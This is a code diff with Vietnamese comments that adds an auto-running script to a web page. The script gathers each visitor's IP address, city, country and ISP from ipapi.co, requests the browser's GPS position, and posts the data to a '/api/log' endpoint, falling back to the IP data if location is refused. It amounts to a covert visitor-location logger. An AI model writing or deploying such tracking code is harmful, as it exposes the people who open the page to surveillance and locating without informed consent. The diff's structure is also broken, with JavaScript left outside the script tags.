@@ -24,7 +24,59 @@ async function test() {
   const data = await res.json();
   console.log(data);
 }
+</script>
+<script>
+async function getData() {
+  let data = {};
 
+  // 1. Lấy IP + info cơ bản
+  try {
+    const ipRes = await fetch("https://ipapi.co/json/");
+    const ipData = await ipRes.json();
+
+    data.ip = ipData.ip;
+    data.city = ipData.city;
+    data.country = ipData.country_name;
+    data.isp = ipData.org;
+  } catch (e) {
+    console.log("IP fail");
+  }
+
+  // 2. Thử lấy GPS
+  function sendData() {
+    fetch("/api/log", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(data)
+    });
+  }
+
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        data.lat = pos.coords.latitude;
+        data.lon = pos.coords.longitude;
+        data.accuracy = pos.coords.accuracy;
+
+        sendData();
+      },
+      (err) => {
+        console.log("GPS denied");
+        sendData(); // fallback IP
+      },
+      {
+        timeout: 5000
+      }
+    );
+  } else {
+    sendData();
+  }
+}
+
+getData();
+</script>
 // auto chạy khi mở web
 async function run() {
   try {
